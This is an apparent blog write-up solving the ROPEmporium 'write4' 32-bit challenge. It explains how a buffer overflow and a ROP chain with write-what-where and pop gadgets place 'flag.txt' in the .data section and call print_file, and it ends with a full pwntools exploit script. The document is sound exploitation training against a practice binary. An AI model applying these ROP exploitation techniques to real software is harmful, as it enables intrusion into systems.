---
title: "ROPEmporium: write4 32-bit"
date: 2021-05-24T19:41:00+02:00
---

# Writeup of write four [write4] on ROPEmporium

Prerequisites: Basic knowledge of assembly, disassembling tools, the previous challenges, and calling convention

------------------------------------
We're told the following: "A PLT entry for a function named print_file() exists within the challenge binary, 
simply call it with the name of a file you wish to read (like 'flag.txt') as the 1st argument. The 'flag.txt' isn't present in the binary"

We need a writeable part of memory, because we need to write the string into the binary. 

```c
0x080483f0]> iS

nth paddr        size vaddr       vsize perm name

24  0x00001018    0x8 0x0804a018    0x8 -rw- .data
```
[Other sections have been removed due to easier readability]

We're going to write out flag into this section. The section has a size of 8, which is perfect for our payload of 8 characters. Originally I used a different section with a larger size, this caused the string not to be null-terminated, and therefore the payload didn't work.

Now how are we going to write to this section? That's our next problem. We'll need to use a "write/what/where" gadget, such as: ```mov [reg], reg```
The gadget moves the value of reg, into the address pointed to by reg. This is what the [] brackets are for.

We can open the binary with gdb, and look at the usefulGadgets function (addr found with info func)
```c
pwndbg> disass usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x08048543 <+0>: mov    DWORD PTR [edi],ebp
   0x08048545 <+2>: ret    
```
We have a gadget that moves the value from ebp into the address pointed to by edi. Now we need a gadget, that can control the values in the edi and ebp registers. If we remember
the crucial basic instruction "pop", this is a way of setting a registers value. (It does also increment the stackpointer, but we don't care about that right now)
```bash
cave@noobpwn:~/binexp/ROP-emperium/write4_32$ ROPgadget --binary write432 | grep pop

0x080485aa : pop edi ; pop ebp ; ret
```
[Other results removed for readability]

Great! So we have a gadget to set the registers. Now we'll need to put together the ropchain.

```
pop_edi_pop_ebp + datasegm + b"flag"
mov_[edi]_ebp

pop_edi_pop_ebp + datasegm+0x4 + b".txt"
mov_[edi]_ebp

print_file + datasegm
```
It's important to remember that the gadget works as a: ```mov destination, source```


The reason for our +0x4, is that we can only have 4 bytes in an address at once. 1 address is equal to 32 bit, which is the same as 4 bytes.

Now we just need the print_file call, where we need this datasegm (beginning) to be the argument! And flag!:)

Exploit:

```python
from pwn import *

elfPath="./write432"
context.arch="i386"


print_file=p32(0x08048538)
datasegm=0x0804a018

mov=p32(0x08048543) #mov [edi], ebp
pop=p32(0x080485aa) #pop edi; pop ebp

gdbscript= f"""
c
"""

terminalSetting = ['gnome-terminal', '-e']
context.clear(terminal=terminalSetting)

io = pwnlib.gdb.debug(elfPath, gdbscript = gdbscript)

mnm = cyclic_gen()
mnm = mnm.get(80)
point=cyclic_find(b"laaa", endian="little")
#6161616c is at the return or laaa


def main():
    print(io.recvuntil("> "))
    
    payload=b"A"*point #padding
    payload+=pop+p32(datasegm)+b"flag" 
    payload+=mov 
    payload+=pop+p32(datasegm+0x4)+b".txt" 
    payload+=mov 
    payload+=print_file+p32(datasegm) #Call print_file with the memory as argument

    io.send(payload)
    print(io.recv(2048))
    io.interactive()

main()
```
